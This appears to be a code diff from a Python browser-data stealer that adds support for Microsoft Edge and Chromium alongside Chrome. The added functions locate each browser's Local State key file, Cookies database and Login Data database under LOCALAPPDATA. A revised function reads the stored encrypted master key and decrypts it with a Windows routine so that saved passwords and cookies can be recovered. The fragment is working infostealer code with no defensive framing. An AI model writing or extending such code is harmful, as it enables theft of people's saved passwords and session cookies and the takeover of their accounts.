@@ -21,6 +21,21 @@ def chrome_80_decrypt(encrypted, chrome_key):
     return decrypted[:-16].decode()
 
 
+def chromnium_exists():
+    LOCAL = os.environ['LOCALAPPDATA']
+    return os.path.exists(f"{LOCAL}/Chromium/User Data")
+
+
+def edge_exists():
+    LOCAL = os.environ['LOCALAPPDATA']
+    return os.path.exists(f"{LOCAL}/Microsoft/Edge/User Data")
+
+
+def chrome_exists():
+    LOCAL = os.environ['LOCALAPPDATA']
+    return os.path.exists(f"{LOCAL}/Google/Chrome/User Data")
+
+
 def get_chrome_directories():
     LOCAL = os.environ['LOCALAPPDATA']
     chrome_dir = f"{LOCAL}/Google/Chrome/User Data/"
@@ -31,10 +46,30 @@ def get_chrome_directories():
     return key_directory, cookie_directory, login_directory
 
 
-def get_chrome_key(key_directory):
+def get_edge_directories():
+    LOCAL = os.environ['LOCALAPPDATA']
+    edge_dir = f"{LOCAL}/Microsoft/Edge/User Data/"
+    key_directory = f"{edge_dir}/Local State"
+    cookie_directory = f"{edge_dir}/Default/Cookies"
+    login_directory = f"{edge_dir}/Default/Login Data"
+
+    return key_directory, cookie_directory, login_directory
+
+
+def get_chromium_directories():
+    LOCAL = os.environ['LOCALAPPDATA']
+    chromium_dir = f"{LOCAL}/Chromium/User Data/"
+    key_directory = f"{chromium_dir}/Local State"
+    cookie_directory = f"{chromium_dir}/Default/Cookies"
+    login_directory = f"{chromium_dir}/Default/Login Data"
+
+    return key_directory, cookie_directory, login_directory
+
+
+def get_encryption_key(key_directory):
     with open(key_directory, "r") as f:
-        chrome_key = json.loads(f.read())["os_crypt"]["encrypted_key"]
-        return win_decrypt(base64.b64decode(chrome_key)[5:])
+        encryption_key = json.loads(f.read())["os_crypt"]["encrypted_key"]
+        return win_decrypt(base64.b64decode(encryption_key)[5:])
 
 
 def get_cookies(directory, key):
